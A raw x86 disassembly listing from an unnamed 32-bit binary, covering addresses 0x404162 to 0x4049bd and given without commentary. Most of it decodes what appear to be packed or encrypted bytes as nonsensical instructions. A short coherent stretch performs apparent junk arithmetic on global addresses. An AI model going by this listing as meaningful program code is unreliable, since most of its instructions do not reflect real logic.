  404162:	sbb    al,0x36
  404164:	add    dl,bh
  404166:	push   ss
  404167:	lea    edx,[edi-0x15]
  40416a:	or     BYTE PTR [edi+0x54],ah
  40416d:	stos   BYTE PTR es:[edi],al
  40416e:	dec    ecx
  40416f:	test   eax,ebp
  404171:	and    cl,BYTE PTR [ebp+esi*4-0x21]
  404175:	sub    BYTE PTR [edx+0x67],al
  404178:	fst    DWORD PTR [edx-0x56]
  40417b:	and    al,0x5e
  40417d:	aas    
  40417e:	loop   0x404154
  404180:	jns    0x404110
  404182:	inc    ebx
  404183:	in     eax,dx
  404184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404185:	mov    ?,WORD PTR [edx+0x6f]
  404188:	in     al,0xb6
  40418a:	cs das 
  40418c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40418d:	repz aaa 
  40418f:	or     ecx,DWORD PTR [ebp+edx*1-0xc85533d]
  404196:	dec    edi
  404197:	aam    0xb5
  404199:	hlt    
  40419a:	mov    fs,WORD PTR [edx+edi*2]
  40419d:	pusha  
  40419e:	out    0x80,eax
  4041a0:	sub    edx,ebp
  4041a2:	bound  edx,QWORD PTR [edx]
  4041a4:	lahf   
  4041a5:	fisub  DWORD PTR [edx]
  4041a7:	cmp    edi,DWORD PTR [ebp+0x65]
  4041aa:	icebp  
  4041ab:	inc    ebp
  4041ac:	std    
  4041ad:	int3   
  4041ae:	test   DWORD PTR [edx],ebp
  4041b0:	and    BYTE PTR [edi+0x3838b297],0x27
  4041b7:	bnd jns 0x404232
  4041ba:	ss push esi
  4041bc:	sub    DWORD PTR [ebp+0x61],edi
  4041bf:	cdq    
  4041c0:	fisub  WORD PTR [eax]
  4041c2:	inc    edi
  4041c3:	in     eax,0x19
  4041c5:	add    BYTE PTR [eax-0x1a0ee7a9],cl
  4041cb:	xchg   ebx,eax
  4041cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041cd:	pushf  
  4041ce:	pop    ecx
  4041cf:	mov    ecx,0x387ff772
  4041d4:	jo     0x4041c7
  4041d6:	call   0x53073f39
  4041db:	fstp   TBYTE PTR ds:0x96365ffd
  4041e1:	scas   al,BYTE PTR es:[edi]
  4041e2:	mov    al,ss:0xb42e03b2
  4041e8:	dec    edx
  4041e9:	jp     0x4041f9
  4041eb:	adc    eax,0xa493f50e
  4041f0:	inc    edx
  4041f1:	jg     0x404204
  4041f3:	and    eax,0x149ab82f
  4041f8:	stc    
  4041f9:	push   ebx
  4041fa:	xchg   BYTE PTR [edi+esi*4+0xa2eb27e],bh
  404201:	inc    edi
  404202:	mov    edi,0x635ca3fe
  404207:	pop    es
  404208:	jns    0x4041b5
  40420a:	mov    bh,0x6f
  40420c:	int3   
  40420d:	jnp    0x404264
  40420f:	cmp    BYTE PTR [edi-0x2f46a3b1],0x2d
  404216:	out    dx,al
  404217:	sub    BYTE PTR [ebp-0xe],al
  40421a:	(bad)  
  40421b:	cmp    BYTE PTR [esi+0x66712c10],bl
  404221:	fstp   st(3)
  404223:	fdivp  st(6),st
  404225:	add    DWORD PTR [edi-0x62],esp
  404228:	xor    DWORD PTR [esi],ecx
  40422a:	mov    bl,0x3c
  40422c:	xchg   esi,eax
  40422d:	retf   
  40422e:	sub    DWORD PTR [ecx+esi*2-0x55],0x83d5439c
  404236:	ror    BYTE PTR [ecx],1
  404238:	stos   BYTE PTR es:[edi],al
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	(bad)  
  404259:	push   ebx
  40425a:	retf   0x4f4a
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0xb970707d
  404265:	push   esi
  404266:	aas    
  404267:	inc    edi
  404268:	inc    eax
  404269:	pop    ebx
  40426a:	fwait
  40426b:	and    ebx,esi
  40426d:	test   eax,0x9012b0f0
  404272:	sti    
  404273:	call   0xbea296fc
  404278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404279:	jecxz  0x404276
  40427b:	mov    edi,DWORD PTR [eax+ebp*4-0x13]
  40427f:	jmp    0x8820:0xc70c62f7
  404286:	jecxz  0x4042f2
  404288:	pop    esi
  404289:	jp     0x404252
  40428b:	aas    
  40428c:	jae    0x40424c
  40428e:	sub    al,0x3a
  404290:	cdq    
  404291:	out    dx,al
  404292:	adc    eax,0x5d5dc3e7
  404297:	xor    eax,0x2fb968c8
  40429c:	dec    edx
  40429d:	in     eax,0x9c
  40429f:	pop    ebp
  4042a0:	not    BYTE PTR [ecx]
  4042a2:	cli    
  4042a3:	xchg   ecx,eax
  4042a4:	nop
  4042a5:	xchg   edx,eax
  4042a6:	cmp    al,0x26
  4042a8:	add    ebx,DWORD PTR [eax+0x7a140bb6]
  4042ae:	stc    
  4042af:	mov    al,0xd6
  4042b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b2:	jno    0x40431a
  4042b4:	and    eax,0x37d66a4a
  4042b9:	shl    ecx,1
  4042bb:	lods   al,BYTE PTR ds:[esi]
  4042bc:	xchg   esi,eax
  4042bd:	sbb    DWORD PTR [eax+ebp*8-0x21],edi
  4042c1:	sbb    bh,BYTE PTR [ecx-0x7c270797]
  4042c7:	mov    cl,0x4b
  4042c9:	fwait
  4042ca:	icebp  
  4042cb:	sbb    al,0xc9
  4042cd:	arpl   WORD PTR [ebp+edx*2-0x669a932b],di
  4042d4:	xor    ah,ah
  4042d6:	out    dx,al
  4042d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d8:	push   edx
  4042d9:	add    dl,dh
  4042db:	jo     0x404317
  4042dd:	add    eax,0x46be5728
  4042e2:	ror    ebp,cl
  4042e4:	jle    0x404286
  4042e6:	in     al,0xa9
  4042e8:	stc    
  4042e9:	sahf   
  4042ea:	outs   dx,DWORD PTR ds:[esi]
  4042eb:	jge    0x40435c
  4042ed:	arpl   bx,bp
  4042ef:	and    al,0xea
  4042f1:	jge    0x404288
  4042f3:	mov    eax,ds:0xbb527eb1
  4042f8:	imul   ebp,DWORD PTR [ecx-0x450e9b62],0x9e415790
  404302:	cmp    ah,ch
  404304:	mov    ds:0xfb962a2f,eax
  404309:	inc    esi
  40430a:	and    al,0x86
  40430c:	in     al,dx
  40430d:	mov    eax,0xda66b552
  404312:	add    DWORD PTR [edx+0x60],0xffffffb0
  404316:	aaa    
  404317:	xlat   BYTE PTR ds:[ebx]
  404318:	pop    ds
  404319:	es push es
  40431b:	push   ss
  40431c:	out    0xef,eax
  40431e:	data16 mov ch,0xcc
  404321:	lahf   
  404322:	ins    DWORD PTR es:[edi],dx
  404323:	popf   
  404324:	xchg   cl,cl
  404326:	adc    eax,0xee1c9da5
  40432b:	clc    
  40432c:	pop    ds
  40432d:	scas   eax,DWORD PTR es:[edi]
  40432e:	fist   DWORD PTR [esi+0x43a26119]
  404334:	mov    ch,0x71
  404336:	inc    edi
  404337:	xor    edi,esp
  404339:	aad    0x6f
  40433b:	js     0x404368
  40433d:	push   ebx
  40433e:	test   bh,dh
  404340:	pop    ds
  404341:	add    cl,BYTE PTR [eax-0x73ff1756]
  404347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404348:	leave  
  404349:	aad    0xb8
  40434b:	adc    ebp,esi
  40434d:	fcmovu st,st(4)
  40434f:	fwait
  404350:	imul   ecx,edx,0xffffffe7
  404353:	aas    
  404354:	add    esp,DWORD PTR [ecx+0x78563941]
  40435a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40435b:	out    dx,eax
  40435c:	mov    dh,0xad
  40435e:	in     al,0x31
  404360:	mov    eax,ds:0x20bee173
  404365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404366:	fs in  al,dx
  404368:	cmp    BYTE PTR [ecx-0x7a],cl
  40436b:	push   ebx
  40436c:	mov    esi,0x53bd5a04
  404371:	test   DWORD PTR [eax+ebx*8+0x1],ebx
  404375:	test   cl,cl
  404377:	pop    edx
  404378:	out    dx,al
  404379:	sub    DWORD PTR [esi-0x14d57c18],esi
  40437f:	cmp    BYTE PTR [edx+ebx*8+0x39746fd2],dh
  404386:	sub    BYTE PTR [eax+0x71],0xf4
  40438a:	stos   BYTE PTR es:[edi],al
  40438b:	pop    ebx
  40438c:	xor    edi,ebx
  40438e:	xchg   esp,eax
  40438f:	jge    0x40434f
  404391:	hlt    
  404392:	sub    edi,DWORD PTR [edx]
  404394:	adc    cl,BYTE PTR [edi+eax*2]
  404397:	sub    BYTE PTR [edi-0x1f],bh
  40439a:	outs   dx,DWORD PTR ds:[esi]
  40439b:	cmp    al,0xbd
  40439d:	add    DWORD PTR [esi],esi
  40439f:	str    WORD PTR [esi]
  4043a2:	sbb    ebp,edx
  4043a4:	(bad)  
  4043a6:	scas   eax,DWORD PTR es:[edi]
  4043a7:	cmp    edi,esp
  4043a9:	jne    0x4043fd
  4043ab:	mov    ds:0x8db90f71,eax
  4043b0:	dec    eax
  4043b1:	ins    DWORD PTR es:[edi],dx
  4043b2:	lahf   
  4043b3:	shl    DWORD PTR [ecx+0x50],0xf
  4043b7:	mov    dh,0xd2
  4043b9:	in     eax,0xab
  4043bb:	push   eax
  4043bc:	ja     0x4043e8
  4043be:	cmp    edi,ecx
  4043c0:	xchg   edi,eax
  4043c1:	mov    ch,0x9b
  4043c3:	lahf   
  4043c4:	cmc    
  4043c5:	mov    eax,0xb824a21a
  4043ca:	cmp    DWORD PTR [edx+0x58],eax
  4043cd:	mov    ecx,0xfd1af305
  4043d2:	or     al,0xf1
  4043d4:	add    DWORD PTR [edi],edx
  4043d6:	jo     0x40435c
  4043d8:	sti    
  4043d9:	test   BYTE PTR [edx],bh
  4043db:	mov    dh,0xc5
  4043dd:	xor    DWORD PTR [edx-0x185f0c86],edi
  4043e3:	pop    esp
  4043e4:	repnz lock (bad) 
  4043e8:	fisubr WORD PTR [eax+0x4101d1c5]
  4043ee:	stos   DWORD PTR es:[edi],eax
  4043ef:	or     edx,DWORD PTR [ebx+0x60]
  4043f2:	dec    ebp
  4043f3:	sti    
  4043f4:	and    DWORD PTR [edx+edx*2],edi
  4043f7:	(bad)  
  4043f8:	ds cwde 
  4043fa:	int    0x2b
  4043fc:	mov    ds:0xde218a0b,al
  404401:	out    0x92,al
  404403:	pop    es
  404404:	mov    eax,ds:0x5b125432
  404409:	inc    ebx
  40440a:	adc    bh,cl
  40440c:	into   
  40440d:	mov    dh,0xd0
  40440f:	std    
  404410:	sub    bl,BYTE PTR [ecx-0x64a02a5a]
  404416:	xchg   edi,eax
  404417:	mov    cl,0xd5
  404419:	adc    al,0x7
  40441b:	mov    ds:0x90097c40,eax
  404420:	xor    BYTE PTR [ebx-0x2c9d2eb2],ch
  404426:	popa   
  404427:	sbb    edi,DWORD PTR [esi+esi*8+0x4775dae5]
  40442e:	adc    esp,DWORD PTR [edx+0x7e5b25c7]
  404434:	jmp    0x4043f1
  404436:	adc    dh,BYTE PTR [edx-0xe40928a]
  40443c:	fsubr  QWORD PTR [ebp+0x7399dcd6]
  404442:	call   0x6ef9:0x907431dc
  404449:	dec    edx
  40444a:	or     DWORD PTR [ebp-0x18],edx
  40444d:	test   BYTE PTR [ebx+0x5793fca3],0xb1
  404454:	push   edx
  404455:	(bad)  
  404456:	sub    edx,esp
  404458:	(bad)  
  404459:	mov    al,0x7a
  40445b:	jmp    0x58a0:0xaa60b5e6
  404462:	xchg   esp,eax
  404463:	xchg   esi,eax
  404464:	add    DWORD PTR [edi],esp
  404466:	jo     0x40449c
  404468:	ret    
  404469:	pop    es
  40446a:	out    0xdf,eax
  40446c:	retf   0xb9b8
  40446f:	out    dx,eax
  404470:	es in  eax,0x45
  404473:	push   ebx
  404474:	lods   al,BYTE PTR ds:[esi]
  404475:	mov    WORD PTR ds:0x3ac1dfd5,?
  40447b:	jge    0x404420
  40447d:	or     DWORD PTR [esp+esi*2],ebp
  404480:	fldl2e 
  404482:	xchg   ecx,eax
  404483:	mov    ah,0xa9
  404485:	enter  0x8a2c,0x9e
  404489:	push   es
  40448a:	xor    al,0x48
  40448c:	mov    ds,WORD PTR [ecx]
  40448e:	push   ecx
  40448f:	mov    bh,0x2
  404491:	jecxz  0x4044d8
  404493:	loopne 0x4044d9
  404495:	lods   eax,DWORD PTR ds:[esi]
  404496:	jg     0x404496
  404498:	clc    
  404499:	sub    ah,ch
  40449b:	test   al,0xf7
  40449d:	inc    esi
  40449e:	test   esi,edx
  4044a0:	pop    esi
  4044a1:	call   esi
  4044a3:	pop    esi
  4044a4:	and    esp,DWORD PTR [ebx+ebp*1+0x3d]
  4044a8:	scas   eax,DWORD PTR es:[edi]
  4044a9:	mov    ds:0x4b0ab364,al
  4044ae:	mov    bl,0x70
  4044b0:	popa   
  4044b1:	out    dx,al
  4044b2:	mov    dh,0x5c
  4044b4:	mov    eax,ds:0xbf85bee0
  4044b9:	test   esp,eax
  4044bb:	mov    ds:0x432137b5,al
  4044c0:	call   0x7376b119
  4044c5:	call   0xf9bf:0x2667855
  4044cc:	ror    BYTE PTR [edx-0x3032d860],1
  4044d2:	pop    edi
  4044d3:	sbb    edi,DWORD PTR [esi+0x2f0a8dd8]
  4044d9:	push   edx
  4044da:	and    esp,DWORD PTR [edi-0x112f9f14]
  4044e0:	es jl  0x4044e9
  4044e3:	add    DWORD PTR [eax+edx*1+0x7d],esp
  4044e7:	ret    0x80a6
  4044ea:	mov    bh,0xf
  4044ec:	leave  
  4044ed:	repnz pop es
  4044ef:	aam    0x7e
  4044f1:	pop    ds
  4044f2:	add    ebp,0xdc0f1733
  4044f8:	hlt    
  4044f9:	dec    edi
  4044fa:	lahf   
  4044fb:	je     0x404495
  4044fd:	pop    esp
  4044fe:	das    
  4044ff:	outs   dx,DWORD PTR ds:[esi]
  404500:	xor    BYTE PTR [ebx],0x7b
  404503:	sub    bl,cl
  404505:	loope  0x4044a0
  404507:	xor    DWORD PTR cs:[ebx-0x11ad9e7d],eax
  40450e:	in     al,0x8b
  404510:	dec    ebp
  404511:	rcl    BYTE PTR [eax+ebx*1+0x16],1
  404515:	or     al,0x4a
  404517:	shl    DWORD PTR [edx],cl
  404519:	pop    ecx
  40451a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451b:	xor    ah,ch
  40451d:	cmp    ecx,DWORD PTR [esi]
  40451f:	and    al,0x94
  404521:	je     0x4044be
  404523:	mov    ecx,0xde18a85f
  404528:	psubsw mm0,QWORD PTR [eax+0x14]
  40452c:	test   ebp,0xb040b0cd
  404532:	call   0x3d76:0x2788c6c
  404539:	sub    BYTE PTR ds:0x77d3cc06,ch
  40453f:	push   DWORD PTR [eax+0x5]
  404542:	imul   esp,DWORD PTR [esi],0xe14104c9
  404548:	inc    esp
  404549:	lods   eax,DWORD PTR ds:[esi]
  40454a:	paddusw mm5,QWORD PTR [ebx-0x6a]
  40454e:	bound  edx,QWORD PTR [edi-0x34bc7239]
  404554:	mov    BYTE PTR ds:0xe901c4b7,bl
  40455a:	jno    0x40454f
  40455c:	loop   0x40458c
  40455e:	jge    0x404587
  404560:	xchg   edx,eax
  404561:	or     ebx,ebx
  404563:	sub    eax,0xc9cd2431
  404568:	ret    0x644
  40456b:	repz popa 
  40456d:	add    esi,DWORD PTR [ecx+eax*2-0x1bddf54d]
  404574:	inc    eax
  404575:	es sub al,0xc8
  404578:	pop    ecx
  404579:	lahf   
  40457a:	imul   edx,edi,0x3736db5f
  404580:	daa    
  404581:	call   0xded2fc02
  404586:	inc    esp
  404587:	adc    al,0x9b
  404589:	(bad)  
  40458a:	in     al,dx
  40458b:	adc    DWORD PTR [ebp-0x13f7ab70],0xfb9318f9
  404595:	cmp    ch,BYTE PTR [ebp+esi*8-0x9]
  404599:	add    ebp,DWORD PTR [eax-0x57d70e81]
  40459f:	int    0xc1
  4045a1:	aaa    
  4045a2:	cmc    
  4045a3:	sbb    BYTE PTR [ebp+0x24],bl
  4045a6:	int    0xf
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	lock sahf 
  4045c9:	repz cs or al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x870707d
  4045d4:	xchg   DWORD PTR [esp+eax*2-0x2254d446],eax
  4045db:	call   0x3dae:0xc190e3d5
  4045e2:	mov    bl,0xb9
  4045e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e5:	add    al,0x1c
  4045e7:	sub    eax,0x8deb214
  4045ec:	cmp    al,0x2
  4045ee:	test   DWORD PTR [ebp+0x1a57f73c],0xdea9a2b1
  4045f8:	mov    al,0x5
  4045fa:	jns    0x404595
  4045fc:	pop    esp
  4045fd:	mov    ecx,0xd6b7d330
  404602:	sbb    dl,dh
  404604:	cmc    
  404605:	sbb    al,0x15
  404607:	hlt    
  404608:	mov    esi,0x9eb6787d
  40460d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40460e:	pusha  
  40460f:	(bad)  
  404612:	fdiv   DWORD PTR [eax+0x60]
  404615:	add    al,0xc6
  404617:	mov    DWORD PTR [edi-0x1675ddf4],ecx
  40461d:	jne    0x404612
  40461f:	xor    BYTE PTR [esi+0x5b2fc85],ch
  404625:	mov    ds:0xeddfab0e,eax
  40462a:	mov    cl,0xdf
  40462c:	jl     0x4045ea
  40462e:	push   esi
  40462f:	jmp    0xacf2:0x8cb41b90
  404636:	dec    esp
  404637:	dec    edx
  404638:	jmp    0xf4ce:0x6293a805
  40463f:	jbe    0x404608
  404641:	push   ecx
  404642:	sub    al,0x67
  404644:	dec    edx
  404645:	cmovb  esp,DWORD PTR [ebx+0x686682d7]
  40464c:	loopne 0x40468d
  40464e:	push   0xffffffd4
  404650:	push   cs
  404651:	enter  0x9c7b,0x67
  404655:	dec    esi
  404656:	sbb    BYTE PTR [esi+0x6a8cf6f3],ch
  40465c:	sbb    BYTE PTR [edx-0x61],bh
  40465f:	push   edi
  404660:	xchg   ecx,eax
  404661:	sbb    al,0xb9
  404663:	jl     0x40462f
  404665:	aaa    
  404666:	cmc    
  404667:	push   ebx
  404668:	inc    eax
  404669:	sbb    DWORD PTR [edx+edi*1-0x3017b636],esi
  404670:	stc    
  404671:	pop    esp
  404672:	fbld   TBYTE PTR [ebp-0x58]
  404675:	xor    dl,bh
  404677:	lds    edx,FWORD PTR [ecx-0x5d0804e5]
  40467d:	cmp    edi,DWORD PTR [ebx]
  40467f:	outs   dx,DWORD PTR ds:[esi]
  404680:	push   esp
  404681:	jo     0x4046e5
  404683:	xor    cl,BYTE PTR [esi+0x1dc87562]
  404689:	dec    ecx
  40468a:	enter  0x1555,0x4d
  40468e:	sub    ecx,DWORD PTR [esi-0x70ab286f]
  404694:	xor    eax,0x8782385b
  404699:	mov    ebp,0x51eaa506
  40469e:	cmp    al,0x1c
  4046a0:	dec    ebx
  4046a1:	jnp    0x40469d
  4046a3:	sub    edx,DWORD PTR [ecx-0x78cef8d0]
  4046a9:	mov    ?,ebp
  4046ab:	mov    esi,0xa67a55d4
  4046b0:	adc    dl,BYTE PTR [ebp-0x5b76c306]
  4046b6:	mov    cl,0x5c
  4046b8:	inc    ebx
  4046b9:	enter  0x2974,0x49
  4046bd:	xchg   edi,eax
  4046be:	mov    esp,DWORD PTR [ecx-0x50]
  4046c1:	mov    esi,0xf663e22b
  4046c6:	jns    0x40464d
  4046c8:	xlat   BYTE PTR ds:[ebx]
  4046c9:	and    DWORD PTR [esi],esi
  4046cb:	xlat   BYTE PTR ds:[ebx]
  4046cc:	aad    0xe7
  4046ce:	sbb    eax,0x77ed275e
  4046d3:	pop    esi
  4046d4:	mov    eax,ds:0x8fd425ba
  4046d9:	pop    esi
  4046da:	(bad)  
  4046dc:	xor    DWORD PTR [ebx],0x40
  4046df:	sar    BYTE PTR [ebx-0x76686724],0x88
  4046e6:	stos   BYTE PTR es:[edi],al
  4046e7:	mov    ch,0x7f
  4046e9:	jbe    0x40472a
  4046eb:	repz jmp 0x404733
  4046ee:	mov    dl,0xcd
  4046f0:	stos   BYTE PTR es:[edi],al
  4046f1:	mov    gs,WORD PTR [ecx]
  4046f3:	and    BYTE PTR [ebx-0x67],0x1c
  4046f7:	mov    edx,esp
  4046f9:	or     cl,ch
  4046fb:	rcr    BYTE PTR [esi-0x6d0eac01],1
  404701:	repnz mov eax,ds:0x77b4da8f
  404707:	bound  eax,QWORD PTR [edx]
  404709:	scas   al,BYTE PTR es:[edi]
  40470a:	(bad)  
  40470b:	frstor [esi-0xb0b99d]
  404711:	sub    BYTE PTR [ebp+edi*4+0x3b5fe894],dl
  404718:	pushf  
  404719:	mov    bl,0x19
  40471b:	jmp    0x5b1e443f
  404720:	iret   
  404721:	dec    ecx
  404722:	fnstcw WORD PTR [edi+ebp*8+0x6d42ba68]
  404729:	jnp    0x40471c
  40472b:	ds std 
  40472d:	pop    ebx
  40472e:	or     BYTE PTR [edi-0x507bf41b],cl
  404734:	hlt    
  404735:	ins    BYTE PTR es:[edi],dx
  404736:	fs retf 0xf19e
  40473a:	loop   0x40470b
  40473c:	jmp    0x404740
  40473e:	xchg   ebx,eax
  40473f:	adc    ebx,DWORD PTR [ebx+ebp*1-0x46]
  404743:	push   esp
  404744:	mov    eax,0xea7b4486
  404749:	aad    0x7a
  40474b:	(bad)  [edx+edx*1]
  40474e:	ja     0x404729
  404750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404751:	jg     0x404752
  404753:	xlat   BYTE PTR ds:[ebx]
  404754:	mov    ds:0x1e2f2c27,eax
  404759:	dec    edx
  40475a:	pop    ecx
  40475b:	and    ebp,esp
  40475d:	les    ecx,FWORD PTR [eax-0x36]
  404760:	lea    eax,cs:0xd706ee0d
  404767:	fld    TBYTE PTR [ebx]
  404769:	stc    
  40476a:	ret    0xf2d9
  40476d:	mov    al,0xd5
  40476f:	mov    eax,ds:0x6d21e953
  404774:	or     BYTE PTR [edi-0x3885a817],al
  40477a:	fldenv [esi]
  40477c:	mov    ds:0x7b3f3b8,al
  404781:	into   
  404782:	(bad)  
  404784:	push   edx
  404785:	aaa    
  404786:	push   0x9ea811ad
  40478b:	xor    al,BYTE PTR [edx+0x16]
  40478e:	cmp    DWORD PTR [ebp+0x71],0xc9f7a391
  404795:	pop    eax
  404796:	aam    0x3c
  404798:	lock adc al,0x74
  40479b:	adc    DWORD PTR [eax+0x568be221],ebx
  4047a1:	mov    esi,0xc22d2308
  4047a6:	pop    esi
  4047a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047a8:	mov    ds:0xecd6dfd,al
  4047ad:	push   ds
  4047ae:	outs   dx,BYTE PTR ds:[esi]
  4047af:	dec    edx
  4047b0:	dec    esi
  4047b1:	ret    
  4047b2:	add    ebp,0x34bdaaba
  4047b8:	and    BYTE PTR [eax],ch
  4047ba:	inc    esp
  4047bb:	test   eax,0x7eb19d03
  4047c0:	or     ecx,edx
  4047c2:	jo     0x4047d4
  4047c4:	mov    cl,0x8c
  4047c6:	add    edx,DWORD PTR [eax+0x79f1e16c]
  4047cc:	aaa    
  4047cd:	arpl   WORD PTR [esi+eiz*2+0x57ebd1b8],cx
  4047d4:	sub    al,0x56
  4047d6:	test   BYTE PTR [esi],dh
  4047d8:	add    BYTE PTR [ebp+0x3b],bl
  4047db:	or     DWORD PTR [ebx+0x6c176a80],edi
  4047e1:	(bad)  
  4047e2:	jmp    0x9c763823
  4047e7:	push   ebx
  4047e8:	mov    ebp,0x6dbf4a4
  4047ed:	push   edx
  4047ee:	xchg   esi,eax
  4047ef:	adc    ebx,ebp
  4047f1:	ss ret 0xa654
  4047f5:	inc    edi
  4047f6:	mov    ah,BYTE PTR [esi-0x5c8290a7]
  4047fc:	adc    bh,BYTE PTR [ebp+0x48]
  4047ff:	ins    BYTE PTR es:[edi],dx
  404800:	jl     0x404812
  404802:	inc    ebx
  404803:	ss cmp al,bh
  404806:	repz fs retf 
  404809:	mov    edi,0x90cd82ca
  40480e:	mov    al,ds:0x79af3457
  404813:	mov    esi,0x148a54ca
  404818:	dec    esi
  404819:	cwde   
  40481a:	(bad)  
  40481b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40481c:	xor    eax,0x8dcfd83b
  404821:	ins    DWORD PTR es:[edi],dx
  404822:	add    esp,DWORD PTR [ecx+0x36346241]
  404828:	cld    
  404829:	test   DWORD PTR [edi-0x13e08ea8],0x9def9c8c
  404833:	daa    
  404834:	jb     0x404846
  404836:	add    ecx,edi
  404838:	pop    eax
  404839:	sub    ah,BYTE PTR [eax-0x2c]
  40483c:	push   es
  40483d:	and    cl,BYTE PTR [eax-0x394ede11]
  404843:	add    bl,cl
  404845:	sti    
  404846:	loope  0x404851
  404848:	fisub  DWORD PTR [eax+0x5c]
  40484b:	rol    BYTE PTR [ecx+0x3423c638],0xa1
  404852:	cwde   
  404853:	xor    DWORD PTR [eax],0xb67813fd
  404859:	rcl    DWORD PTR [edx],0x30
  40485c:	ja     0x40487c
  40485e:	jnp    0x4048c6
  404860:	lods   eax,DWORD PTR ds:[esi]
  404861:	xchg   edi,eax
  404862:	push   eax
  404863:	ud1    ebx,DWORD PTR [esi-0x4e6f2b7f]
  40486a:	jmp    0x4c39:0x6d57a9b
  404871:	inc    ecx
  404872:	jmp    ecx
  404874:	call   0x2433951c
  404879:	pop    ss
  40487a:	js     0x40480f
  40487c:	or     dh,cl
  40487e:	push   cs
  40487f:	stos   BYTE PTR es:[edi],al
  404880:	test   bl,dl
  404882:	xor    DWORD PTR [esi-0x3b],edx
  404885:	stos   BYTE PTR es:[edi],al
  404886:	loope  0x404897
  404888:	aaa    
  404889:	in     eax,dx
  40488a:	shl    ecx,cl
  40488c:	add    BYTE PTR [ebp-0x6253ea2a],bl
  404892:	gs and al,0x98
  404895:	mov    bl,0x3
  404897:	movlps xmm0,QWORD PTR [eax]
  40489a:	push   ebp
  40489b:	cmp    DWORD PTR [esi+0x15dc45b0],edx
  4048a1:	std    
  4048a2:	mov    ds:0x3bdf0c54,eax
  4048a7:	sub    ebx,esp
  4048a9:	dec    ebp
  4048aa:	call   0x193a16e0
  4048af:	add    BYTE PTR [edi+edx*4-0x45],al
  4048b3:	and    eax,0x90b271ce
  4048b8:	push   esi
  4048b9:	xor    BYTE PTR ds:0x172f4283,dl
  4048bf:	enter  0x8e96,0x86
  4048c3:	nop
  4048c4:	lock sar DWORD PTR es:[edi-0x792d4d0a],0xeb
  4048cd:	les    edi,FWORD PTR [ebx-0x55690bb7]
  4048d3:	mov    db3,edi
  4048d6:	push   edx
  4048d7:	inc    edx
  4048d8:	(bad)  
  4048d9:	mov    ebx,0xa68ed5ac
  4048de:	out    0x66,eax
  4048e0:	std    
  4048e1:	push   0x49
  4048e3:	int3   
  4048e4:	mov    ecx,0xf365d9f9
  4048e9:	jo     0x404924
  4048eb:	mov    ebp,0x794f921
  4048f0:	sbb    DWORD PTR ss:[ebx],0xffffffc9
  4048f4:	in     al,dx
  4048f5:	mov    cl,0x4e
  4048f7:	dec    esi
  4048f8:	jne    0x4048e0
  4048fa:	stos   BYTE PTR es:[edi],al
  4048fb:	cmp    eax,0x9e951e71
  404900:	imul   ebp,DWORD PTR [ebx],0x799775f5
  404906:	in     eax,0xcc
  404908:	adc    edi,DWORD PTR [esi+edi*4-0x7b]
  40490c:	sub    bl,BYTE PTR ds:0xe040a8ee
  404912:	mov    bl,al
  404914:	fistp  WORD PTR [ecx+0x33f4458b]
  40491a:	rol    DWORD PTR [ebx],1
  40491c:	(bad)  
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	xor    al,0x8d
  4049bd:	arpl   sp,bp
